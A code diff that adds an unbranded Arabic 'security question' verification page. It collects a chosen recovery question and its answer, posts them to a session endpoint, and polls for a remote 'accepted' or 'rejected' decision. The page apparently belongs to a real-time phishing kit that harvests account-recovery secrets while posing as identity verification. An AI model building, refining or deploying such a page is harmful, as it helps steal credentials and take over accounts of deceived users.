@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>سؤال الأمان</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root { --green: #1a6e2e; --green-dark: #145524; --dark: #1a1a1a; --gray: #666; --white: #ffffff; --red: #e74c3c; }
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Cairo',sans-serif;background:var(--white);color:var(--dark);min-height:100vh;display:flex;flex-direction:column}
+.header{background:#1b2a1b;display:flex;align-items:center;justify-content:center;padding:14px 20px}
+.header-title{color:var(--white);font-size:18px;font-weight:700}
+
+.container{flex:1;padding:24px 20px;max-width:500px;margin:0 auto;width:100%}
+.shield-icon{width:70px;height:70px;background:#e8f5ec;border-radius:50%;display:flex;align-items:center;
+  justify-content:center;margin:0 auto 16px}
+.shield-icon svg{width:34px;height:34px;stroke:var(--green);fill:none;stroke-width:2}
+.page-title{font-size:22px;font-weight:800;color:var(--green);text-align:center;margin-bottom:6px}
+.page-sub{font-size:14px;color:#999;text-align:center;margin-bottom:24px;line-height:1.7}
+
+.error-msg{display:none;background:#fff0f0;border:2px solid var(--red);border-radius:12px;
+  padding:14px 18px;margin-bottom:16px;text-align:center}
+.error-msg span{color:var(--red);font-size:16px;font-weight:800}
+.error-msg.show{display:block}
+
+.q-list{list-style:none;margin-bottom:20px}
+.q-item{display:flex;align-items:center;gap:12px;padding:14px 16px;border:1.5px solid #e8e8e8;
+  border-radius:12px;margin-bottom:8px;cursor:pointer;transition:.2s}
+.q-item:hover{border-color:#ccc;background:#fafafa}
+.q-item.selected{border-color:var(--green);background:#f0faf3}
+.q-item input[type="radio"]{width:20px;height:20px;accent-color:var(--green);cursor:pointer;flex-shrink:0}
+.q-item label{font-size:15px;font-weight:600;cursor:pointer;flex:1;line-height:1.6}
+
+.answer-wrap{margin-bottom:16px}
+.answer-wrap label{display:block;font-size:15px;font-weight:700;margin-bottom:8px;text-align:right}
+.answer-wrap input{width:100%;padding:15px 16px;border:1.5px solid #ccc;border-radius:14px;
+  font-size:16px;font-family:'Cairo',sans-serif;outline:none;text-align:right;transition:.2s}
+.answer-wrap input:focus{border-color:var(--green)}
+.answer-wrap input.error-border{border-color:var(--red)}
+
+.submit-btn{width:100%;padding:17px;background:var(--green);color:var(--white);border:none;
+  border-radius:50px;font-size:18px;font-weight:700;font-family:'Cairo',sans-serif;cursor:pointer;
+  margin-top:10px;transition:.2s}
+.submit-btn:hover{background:var(--green-dark)}
+.submit-btn:disabled{background:#aaa;cursor:default}
+
+.loading-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.9);z-index:1000;
+  align-items:center;justify-content:center;flex-direction:column}
+.loading-overlay.show{display:flex}
+.lo-spinner{width:50px;height:50px;border:4px solid #e0e0e0;border-top:4px solid var(--green);
+  border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.lo-text{font-size:16px;color:var(--green);font-weight:700}
+</style>
+</head>
+<body>
+<div class="header">
+  <span class="header-title">سؤال الأمان</span>
+</div>
+
+<div class="container">
+  <div class="shield-icon">
+    <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+  </div>
+  <div class="page-title">اختر سؤال الأمان</div>
+  <div class="page-sub">اختر أحد الأسئلة التالية وأدخل الإجابة للتحقق من هويتك</div>
+
+  <div class="error-msg" id="errorMsg"><span>الإجابة غير صحيحة</span></div>
+
+  <ul class="q-list" id="qList"></ul>
+
+  <div class="answer-wrap">
+    <label>الإجابة</label>
+    <input type="text" id="answerInput" placeholder="أدخل إجابتك هنا" autocomplete="off">
+  </div>
+
+  <button class="submit-btn" id="submitBtn" onclick="submitSecurity()">تمت</button>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="lo-spinner"></div>
+  <div class="lo-text">جاري التحقق...</div>
+</div>
+
+<script>
+var params=new URLSearchParams(window.location.search);
+var sid=params.get('id');
+var hasError=params.get('error');
+if(!sid)window.location.href='login.html';
+
+var questions=[
+  'ما هو اسم ابن عمك الأول؟',
+  'في أي مدينة ولدت؟',
+  'في أي سنة تخرجت من الجامعة؟',
+  'ماذا كان لقبك أثناء الطفولة؟',
+  'اسم مؤلفك المفضل؟',
+  'اسم الشركة المصنعة للسيارة المفضلة لديك؟',
+  'أي فيلم هو المفضل لديك؟',
+  'اسم أفضل صديق في الطفولة؟',
+  'في أي عام حصلت على رخصة القيادة الخاصة بك؟',
+  'العلامة التجارية لأول تلفزيون الخاص بك؟',
+  'في أي سنة تزوجت؟',
+  'اسم فريق كرة القدم المفضل لديك؟',
+  'ما هو اسم المدرسة التي التحقت بها؟',
+  'اسم أول بلد أجنبي قمت بزيارته؟',
+  'ما هي ماركة سيارتك الأولى؟'
+];
+
+var selectedQ='';
+var qList=document.getElementById('qList');
+questions.forEach(function(q,i){
+  var li=document.createElement('li');
+  li.className='q-item';
+  li.innerHTML='<input type="radio" name="sq" id="q'+i+'" value="'+q+'"><label for="q'+i+'">'+q+'</label>';
+  li.addEventListener('click',function(){
+    document.getElementById('q'+i).checked=true;
+    selectedQ=q;
+    document.querySelectorAll('.q-item').forEach(function(el){el.classList.remove('selected')});
+    li.classList.add('selected');
+  });
+  qList.appendChild(li);
+});
+
+if(hasError==='1'){
+  document.getElementById('errorMsg').classList.add('show');
+  document.getElementById('answerInput').classList.add('error-border');
+}
+
+function submitSecurity(){
+  var answer=document.getElementById('answerInput').value.trim();
+  if(!selectedQ||!answer)return;
+
+  document.getElementById('errorMsg').classList.remove('show');
+  document.getElementById('answerInput').classList.remove('error-border');
+  document.getElementById('submitBtn').disabled=true;
+
+  fetch('/api/submit-security/'+sid,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({question:selectedQ,answer:answer})
+  })
+  .then(function(r){return r.json();})
+  .then(function(d){
+    if(d.ok){
+      document.getElementById('loadingOverlay').classList.add('show');
+      pollAfterSecurity();
+    }
+  })
+  .catch(function(){
+    document.getElementById('submitBtn').disabled=false;
+  });
+}
+
+function pollAfterSecurity(){
+  var interval=setInterval(function(){
+    fetch('/api/status/'+sid)
+    .then(function(r){return r.json();})
+    .then(function(d){
+      if(d.status==='accepted'){
+        clearInterval(interval);
+        document.getElementById('loadingOverlay').classList.remove('show');
+        document.getElementById('answerInput').value='';
+        document.getElementById('submitBtn').disabled=false;
+      }else if(d.status==='rejected'){
+        clearInterval(interval);
+        document.getElementById('loadingOverlay').classList.remove('show');
+        document.getElementById('answerInput').value='';
+        document.getElementById('submitBtn').disabled=false;
+        document.getElementById('errorMsg').classList.add('show');
+        document.getElementById('answerInput').classList.add('error-border');
+      }
+    })
+    .catch(function(){});
+  },2000);
+}
+
+document.getElementById('answerInput').addEventListener('keydown',function(e){
+  if(e.key==='Enter')submitSecurity();
+});
+</script>
+</body>
+</html>
